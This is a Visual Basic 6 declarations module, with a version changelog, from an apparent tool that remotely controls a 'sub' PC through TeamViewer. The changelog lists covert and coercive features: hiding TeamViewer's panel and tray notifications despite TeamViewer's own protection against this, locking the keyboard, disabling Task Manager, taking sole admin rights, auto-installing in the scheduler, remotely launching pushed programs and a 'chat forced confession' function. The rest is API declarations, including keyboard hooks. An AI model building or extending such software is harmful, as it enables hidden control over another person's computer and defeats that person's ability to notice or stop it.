Attribute VB_Name = "Déclarations"
Public Const Mode_debug As Boolean = False

Public Const Version = "V10.00"

' V1.0  First operational version
' V2.0  First version with its documentation
' V4.3  Automatic install in scheduler
'        Hides main window and Tray notification (file transfer)
' V4.4  Bug fixing (TVStartsWithWindows...)
' V4.5  Permanent hidden tv panel
' V4.6  Other permanent functions + new funtions
' V4.7  Lock Keyboard as Long command + Tool Protection + make the only admin
' V5.0  Ability to transfert and launch a program
' V5.1  Ability to transfer and/or launch a program on the desktop or temp
' V5.2  Ability to setup and force the wallpaper
' V5.3  File transfer with Chunks
' V5.4  File transfer with ID
' V5.6  Lock files
' V5.7  File management (transf, wallpaper, launch and lock using chunks)
' V5.8  Acknolegment of Tool password change
' V5.9  Tool passwords saving
' V6.0  Return PW error
' V6.1  Fix of space issue in command line
' V6.2  Welcome Background picture
' V6.3  Welcome pic preview
' V6.4  First scheduled function
' V6.5  Fix an Error of packaging
' V6.6  Scheduled actions
' V6.7  Recover WallPaper
' V6.8  Schedule management after file upload
' V6.9  Timelag management for scheduler
' V7.00 Remove the ReleaseWelcomeScreen from the GetScreenResolution
' V7.01 Permanant WelcomeScreen
' V7.02 Function Alert Connexion
' V7.03 Mouse speed change
' V7.04 Fix: Abort Schedule from Dom side didn't work
' V7.05 Function Get htvp status
' V8.00 Return goes to the right dom side tool (no conflict when more than one dom side tool are working on the same sub pc)
' V8.01 Lock file: better speed
' V8.02 Better lock file
' V8.03 Hide minimized TV Panel
' V8.04 Prevent from TV Panel hidding as TeamViewer is protected against this from version 12.0.75813
' V9.00 New way to hide the TV Panel
' V9.01 Hidding TV Panel compatible with multiple monitors
' V9.02 Disable/Enable task manager
' V9.02 No Keyboard hook anymore (to see if it fixes some issues)
' V9.04 Hide TV Computer List resize the main TV Window
' V9.05 Chat forced confession function
' V9.06 Permanent parameters not in tmp folder anymore
' V10.00 PC names are checked in upercase mode

Public Const Customization = "CustomFlag/TV/TVControl/XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
Public S_Prefix As String
Public L_Prefix As String

Public Const NomFictmp = "satmpfic.txt"
Public Fictmp As String
Public Fic_ini As String

Public Exe_Install As String
Public Const lg_crc = 40
Public Const lg_encrypted = 1000
Public ResizeMainWindow As Boolean
Public hidetv As Boolean
Public hidetvPermanent As Boolean
Public TVWasHidden As Boolean
Public TVPanel_Left As Long
Public TVPanel_Top As Long
Public TVWasMinimized As Boolean
Public AlertConnection As Boolean
Public AlarmHasBeenPlayed As Boolean
Public hidetvTrayNotification As Boolean
Public TrayWasHidden As Boolean
Public Hide_MainTV As Boolean
Public MainTVWasHidden As Boolean
Public HideTVComp As Boolean
Public TVCompWasHidden As Boolean
Public nokey As Boolean
Public tv_exit As Boolean
Public ClpBrd As String
Public S_To_Type As String
Public S_Typed As String
Public s_CurrentClipboard As String
Public mean_add_clipboard As Boolean
Public mean_force_to_type As Boolean
Public s_add_fin_clipboard As String
Public TmpDir As String
Public TeamViewer_hwnd As Long
Public ToolPW As String
Public WallPaperPermanent As Boolean
Public WelcomeScreenPermanent As Boolean
Public s_Deadline As String
Public s_Message As String
Public s_MessageDate As String
Public s_MessageDisplayed As String
Public s_ReleaseCode As String
Public ChatConfession_On As Boolean

Public t_ChatRooms() As String
Public nb_t_ChatRooms As Long

' File reception
'---------------
Public Recep_FilePathAndName As String
Public Recep_LastNumChunk As Integer
Public Recep_Content As String
Public Recep_ID As String

' Codes indiquant les option de transfert d'un fichier et notamment
' les fonctions à lancer après le transfert.
'------------------------------------------------------------------
Public Const Trsf_Temp = &H1
Public Const Trsf_Desktop = &H2
Public Const Trsf_Launch = &H4
Public Const Trsf_WallPaper = &H8
Public Const Trsf_Permanent = &H10
Public Const Trsf_LongName = &H20
Public Const Trsf_Documents = &H40
Public Const Trsf_Pictures = &H80
Public Const Trsf_Welcome = &H100
Public Const Trsf_Schedule = &H200

Public Const Path_Welcome_Background = "C:\Windows\System32\oobe\info\backgrounds"

Public Current_D_PC_Name As String

Public Nom_Wallpaper As String
Public Nom_WelcomeScreen As String
Public Type User_List_Type
    AccountName() As String
    nb_AccountName As Integer
End Type


' Activation forcée
'------------------
Public Exec_cmd As String
Public Exec_Par1 As String
Public Exec_Timout As Long
Public dbExecWindows As Double
Public Exec_Hwnd As Long

Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Long, ByVal uParam As Long, ByVal lpvParam As Any, ByVal fuWinIni As Long) As Long
Public Const SPI_SETDESKWALLPAPER = 20
Public Const SPI_GETDESKWALLPAPER = &H73
Public Const SPIF_UPDATEINIFILE = 1
Public Const SPIF_SENDWININICHANGE = 2
Public Const SPI_SETMOUSESPEED = &H71
Public Const MAX_PATH = 260

Public Declare Function IsWindow Lib "user32.dll" (ByVal Hwnd As Long) As Long
Public Declare Function IsWindowVisible Lib "user32" (ByVal Hwnd As Long) As Long

Public Declare Function CallNextHookEx Lib "user32" (ByVal hHook As Long, ByVal ncode As Long, ByVal wParam As Long, lParam As Any) As Long
Public Declare Function UnhookWindowsHookEx Lib "user32" (ByVal hHook As Long) As Long
Public Declare Function SetWindowsHook Lib "user32" Alias "SetWindowsHookA" (ByVal nFilterType As Long, ByVal pfnFilterProc As Long) As Long
Public Declare Function SetWindowsHookEx Lib "user32" Alias "SetWindowsHookExA" (ByVal idHook As Long, ByVal lpfn As Long, ByVal hmod As Long, ByVal dwThreadId As Long) As Long
Public Declare Sub CopyMemory Lib "kernel32" Alias "RtlMoveMemory" (Destination As Any, Source As Any, ByVal Length As Long)
Public Declare Function GetWindowText Lib "user32" Alias "GetWindowTextA" _
(ByVal Hwnd As Long, ByVal lpString As String, ByVal cch As Long) As Long
Public Declare Function EnumWindows Lib "user32" _
(ByVal lpEnumFunc As Long, ByVal lParam As Long) As Long

Public Declare Function ShellExecute Lib "shell32.dll" Alias "ShellExecuteA" (ByVal Hwnd As Long, ByVal lpOperation As String, ByVal lpFile As String, ByVal lpParameters As String, ByVal lpDirectory As String, ByVal nShowCmd As Long) As Long
Global Const WH_KEYBOARD_LL = 13
Global Const WH_KEYBOARD = 2

Public Declare Function OpenProcess Lib "kernel32" (ByVal dwDesiredAccess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As Long) As Long
Public Declare Function GetExitCodeProcess Lib "kernel32" (ByVal hProcess As Long, lpExitCode As Long) As Long
Public Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Public Const STILL_ACTIVE = &H103
Public Const PROCESS_QUERY_INFORMATION = &H400

Declare Function ShowWindow Lib "user32" ( _
                 ByVal Hwnd As Long, _
                 ByVal nCmdShow As Long) As Long
Declare Function GetForegroundWindow Lib "user32.dll" () As Long

Global Const STARTF_USESTDHANDLES = &H100
'Global Const STARTF_USESHOWWINDOW = &H1

Public hook As Long

Public Const HC_ACTION = 0
Type HookStruct
    vkCode As Long
    scancode As Long
    flags As Long
    time As Long
    dwExtraInfo As Long
End Type
Public D_Saisies As String
Public S_Saisies As String

Public Type RECT
    Left As Long
    Top As Long
    Right As Long
    Bottom As Long
End Type

Public Type PointType
    X As Long
    Y As Long
End Type

Declare Function SetWindowPos Lib "user32" ( _
    ByVal Hwnd As Long, _
    ByVal hWndInsertAfter As Long, _
    ByVal X As Integer, _
    ByVal Y As Integer, _
    ByVal cx As Integer, _
    ByVal cy As Integer, _
    ByVal uFlags As Integer _
    ) As Boolean


Declare Function GetWindowRect Lib "user32" ( _
                 ByVal Hwnd As Long, _
                 lpRect As RECT) As Long

Declare Function FindWindow Lib "user32" Alias "FindWindowA" ( _
    ByVal lpClassName As String, _
    ByVal lpWindowName As String _
) As Long

Declare Function FindWindowEx Lib "user32" Alias "FindWindowExA" ( _
    ByVal hWndParent As Long, _
    ByVal hWndChildAfter As Long, _
    ByVal lpszClassName As String, _
    ByVal lpszWindowName As String _
) As Long

Declare Function GetLastError Lib "kernel32" () As Long
Declare Function FormatMessage Lib "kernel32" _
Alias "FormatMessageA" (ByVal dwFlags As Long, _
lpSource As Any, ByVal dwMessageId As Long, _
ByVal dwLanguageId As Long, ByVal lpBuffer As String, _
ByVal nSize As Long, Arguments As Long) As Long

Public Const FORMAT_MESSAGE_FROM_SYSTEM = &H1000

Public Declare Function GetWindowLong Lib "user32" Alias "GetWindowLongA" (ByVal Hwnd As Long, ByVal nIndex As Long) As Long
Public Const GWL_STYLE = (-16)
Public Const WS_VISIBLE = &H10000000

Declare Function GetComputerNameA Lib "kernel32" (ByVal lpBuffer As String, nSize As Long) As Long
Public PC_Name As String

Declare Function WritePrivateProfileString Lib "kernel32" Alias "WritePrivateProfileStringA" ( _
                 ByVal lpApplicationName As String, _
                 ByVal lpKeyName As Any, _
                 ByVal lpString As Any, _
                 ByVal lpFileName As String) As Long
                 
Declare Function GetPrivateProfileString Lib "kernel32" Alias "GetPrivateProfileStringA" ( _
                 ByVal lpApplicationName As String, _
                 ByVal lpKeyName As Any, _
                 ByVal lpDefault As String, _
                 ByVal lpReturnedString As String, _
                 ByVal nSize As Long, _
                 ByVal lpFileName As String) As Long

Public Declare Function PlaySound Lib "winmm.dll" Alias "PlaySoundA" _
    (ByVal lpszName As String, _
     ByVal hModule As Long, _
     ByVal dwFlags As Long) As Long
     
Public Const SND_APPLICATION As Long = &H80
Public Const SND_ALIAS As Long = &H10000
Public Const SND_ALIAS_ID As Long = &H110000
Public Const SND_ASYNC As Long = &H1
Public Const SND_FILENAME As Long = &H20000
Public Const SND_LOOP As Long = &H8
Public Const SND_MEMORY As Long = &H4
Public Const SND_NODEFAULT As Long = &H2
Public Const SND_NOSTOP As Long = &H10
Public Const SND_NOWAIT As Long = &H2000
Public Const SND_PURGE As Long = &H40
Public Const SND_RESOURCE As Long = &H40004
Public Const SND_SYNC As Long = &H0


Public Declare Function EnumDisplayMonitors Lib "user32" (ByVal hdc As Long, lprcClip As Any, ByVal lpfnEnum As Long, dwData As Any) As Long
Public Declare Function MonitorFromRect Lib "user32" (ByRef lprc As RECT, ByVal dwFlags As Long) As Long
Public Declare Function GetMonitorInfo Lib "user32" Alias "GetMonitorInfoA" (ByVal hMonitor As Long, ByRef lpmi As MONITORINFO) As Long
Public Declare Function UnionRect Lib "user32" (lprcDst As RECT, lprcSrc1 As RECT, lprcSrc2 As RECT) As Long
Public Declare Function OffsetRect Lib "user32" (lpRect As RECT, ByVal X As Long, ByVal Y As Long) As Long
Public Declare Function MoveWindow Lib "user32" (ByVal Hwnd As Long, ByVal X As Long, ByVal Y As Long, ByVal nWidth As Long, ByVal nHeight As Long, ByVal bRepaint As Long) As Long

Public Declare Function IsIconic Lib "user32" _
    (ByVal Hwnd As Long) As Long

Public Declare Function SetForegroundWindow Lib "user32" _
    (ByVal Hwnd As Long) As Long


Public Type MONITORINFO
    cbSize As Long
    rcMonitor As RECT
    rcWork As RECT
    dwFlags As Long
End Type
Public Const MONITOR_DEFAULTTONEAREST = &H2
Public rcMonitors() As RECT 'coordinate array for all monitors
Public rcVS         As RECT 'coordinates for Virtual Screen



Public Function GetComputerName() As String
Dim sResult As String * 255
    GetComputerNameA sResult, 255
    GetComputerName = Left(sResult, InStr(sResult, Chr(0)) - 1)
End Function
